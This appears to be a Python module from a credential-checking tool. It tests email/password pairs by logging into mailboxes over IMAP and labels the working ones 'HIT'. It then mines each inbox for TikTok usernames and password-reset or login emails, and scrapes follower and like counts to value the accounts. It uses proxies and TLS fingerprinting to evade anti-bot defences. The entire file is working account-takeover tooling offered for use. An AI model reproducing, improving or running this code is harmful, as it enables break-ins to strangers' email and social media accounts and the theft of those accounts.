"""
TikTok Checker — IMAP inbox + public profile stats.
Fixed: oembed properly handles 404, TLS session for anti-bot,
       username dedup, proper profile data extraction.
"""
import re
import json
import logging
import email as email_lib
from typing import Dict, List, Optional
from ._imap_utils import imap_connect, get_email_body, basic_auth_works

logger = logging.getLogger(__name__)

_SKIP_NAMES = {
    'tiktok','support','noreply','help','team','info','hello','no',
    'hi','dear','the','your','account','email','notification',
}


class TikTokChecker:
    def __init__(self, timeout: int = 20, proxy: str = None):
        self.timeout = timeout
        self.proxy   = proxy
        self.proxies = {'http': proxy, 'https': proxy} if proxy else None

        # TLS fingerprinting for anti-bot
        try:
            from core.tls_session import TLSSession
            self.session = TLSSession(proxy=proxy)
        except Exception:
            import requests
            self.session = requests.Session()
            self.session.headers.update({
                'User-Agent': (
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                    '(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
                ),
                'Accept-Language': 'en-US,en;q=0.9',
            })

    def _kw(self) -> dict:
        k = {'timeout': self.timeout}
        if self.proxies:
            k['proxies'] = self.proxies
        return k

    def _search_inbox(self, email: str, password: str) -> Dict:
        result = {
            'inbox_accessible':    False,
            'tiktok_emails':       0,
            'usernames':           [],
            'verification_found':  False,
            'login_found':         False,
            'password_reset_found':False,
            'notifications':       0,
        }

        if not basic_auth_works(email):
            return result

        imap = imap_connect(email, password, self.timeout)
        if not imap:
            return result

        result['inbox_accessible'] = True
        try:
            imap.select('INBOX', readonly=True)
            ids: set = set()
            for criteria in [
                'FROM "tiktok.com"',
                'FROM "noreply@tiktok.com"',
                'SUBJECT "TikTok"',
            ]:
                try:
                    st, data = imap.search(None, criteria)
                    if st == 'OK' and data[0]:
                        ids.update(data[0].split())
                except Exception:
                    continue
            result['tiktok_emails'] = len(ids)

            for eid in list(ids)[:20]:
                try:
                    st, msg_data = imap.fetch(eid, '(RFC822)')
                    if st != 'OK' or not msg_data or not msg_data[0]:
                        continue
                    msg  = email_lib.message_from_bytes(msg_data[0][1])
                    subj = msg.get('Subject', '')
                    body = get_email_body(msg)
                    full = subj + ' ' + body

                    # @username patterns
                    for un in re.findall(r'@([a-zA-Z0-9_.]{2,24})', full):
                        if un.lower() not in _SKIP_NAMES and un not in result['usernames']:
                            result['usernames'].append(un)
                    # tiktok.com/@username in links
                    for un in re.findall(r'tiktok\.com/@([a-zA-Z0-9_.]{2,24})', full):
                        if un not in result['usernames']:
                            result['usernames'].append(un)

                    sl = subj.lower()
                    if any(w in sl for w in ('verif', 'confirm', 'activate')):
                        result['verification_found'] = True
                    if any(w in sl for w in ('login', 'sign in', 'new login')):
                        result['login_found'] = True
                    if any(w in sl for w in ('password', 'reset')):
                        result['password_reset_found'] = True
                    if any(w in sl for w in ('liked', 'follow', 'comment', 'mention', 'new video')):
                        result['notifications'] += 1
                except Exception:
                    continue
        finally:
            try:
                imap.logout()
            except Exception:
                pass
        return result

    def _get_profile_oembed(self, username: str) -> Optional[Dict]:
        """Get profile via TikTok oembed (most reliable, no auth)."""
        try:
            r = self.session.get(
                f'https://www.tiktok.com/oembed?url=https://www.tiktok.com/@{username}',
                **self._kw()
            )
            if r.status_code == 200:
                data = r.json()
                return {
                    'username':     username,
                    'display_name': data.get('author_name'),
                    'verified':     False,
                    'followers':    None,
                    'following':    None,
                    'likes':        None,
                    'video_count':  None,
                    'source':       'oembed',
                }
            if r.status_code in (404, 400):
                return None  # user not found
        except Exception as exc:
            logger.debug(f"oembed {username}: {exc}")
        return None

    def _get_profile_page(self, username: str) -> Optional[Dict]:
        """Get profile stats via TikTok page scrape (backup)."""
        try:
            r = self.session.get(
                f'https://www.tiktok.com/@{username}',
                **self._kw()
            )
            if r.status_code != 200:
                return None

            # Try __NEXT_DATA__ JSON
            m = re.search(
                r'<script id="__NEXT_DATA__"[^>]*>(.*?)</script>',
                r.text, re.DOTALL
            )
            if m:
                try:
                    nd   = json.loads(m.group(1))
                    user = (
                        nd.get('props', {})
                          .get('pageProps', {})
                          .get('userInfo', {})
                    )
                    if user:
                        stats = user.get('stats', {})
                        info  = user.get('user', {})
                        return {
                            'username':     info.get('uniqueId', username),
                            'display_name': info.get('nickname'),
                            'followers':    stats.get('followerCount'),
                            'following':    stats.get('followingCount'),
                            'likes':        stats.get('heartCount'),
                            'video_count':  stats.get('videoCount'),
                            'verified':     info.get('verified', False),
                            'bio':          (info.get('signature') or '')[:150],
                            'source':       'page_scrape',
                        }
                except json.JSONDecodeError:
                    pass

            # Try SIGI_STATE JSON (newer TikTok pages)
            m2 = re.search(r'window\[.SIGI_STATE.\]\s*=\s*(\{.+?\});', r.text, re.DOTALL)
            if m2:
                try:
                    sd = json.loads(m2.group(1))
                    user_detail = sd.get('UserPage', {}).get('userInfo', {})
                    if user_detail:
                        u = user_detail.get('user', {})
                        s = user_detail.get('stats', {})
                        return {
                            'username':    u.get('uniqueId', username),
                            'display_name':u.get('nickname'),
                            'followers':   s.get('followerCount'),
                            'following':   s.get('followingCount'),
                            'likes':       s.get('heartCount'),
                            'video_count': s.get('videoCount'),
                            'verified':    u.get('verified', False),
                            'source':      'sigi_state',
                        }
                except json.JSONDecodeError:
                    pass
        except Exception as exc:
            logger.debug(f"page_scrape {username}: {exc}")
        return None

    def get_profile(self, username: str) -> Optional[Dict]:
        """Get TikTok profile — oembed first, page scrape fallback."""
        profile = self._get_profile_oembed(username)
        if profile and profile.get('source') == 'oembed':
            # Enrich with page scrape for stats
            enriched = self._get_profile_page(username)
            if enriched:
                profile.update({k: v for k, v in enriched.items() if v is not None})
        return profile

    def check_full(self, email: str, password: str) -> Dict:
        result = {
            'email': email, 'password': password, 'status': 'BAD',
            'has_tiktok':          False,
            'tiktok_emails':       0,
            'usernames':           [],
            'profiles':            [],
            'verification_found':  False,
            'login_found':         False,
            'notifications':       0,
        }

        inbox = self._search_inbox(email, password)
        if not inbox['inbox_accessible']:
            return result

        result['status']             = 'HIT'
        result['tiktok_emails']      = inbox['tiktok_emails']
        result['usernames']          = inbox['usernames'][:5]
        result['verification_found'] = inbox['verification_found']
        result['login_found']        = inbox['login_found']
        result['notifications']      = inbox['notifications']
        result['has_tiktok']         = inbox['tiktok_emails'] > 0

        # Enrich with profile data for first 3 usernames
        for un in inbox['usernames'][:3]:
            profile = self.get_profile(un)
            if profile:
                result['profiles'].append(profile)

        return result
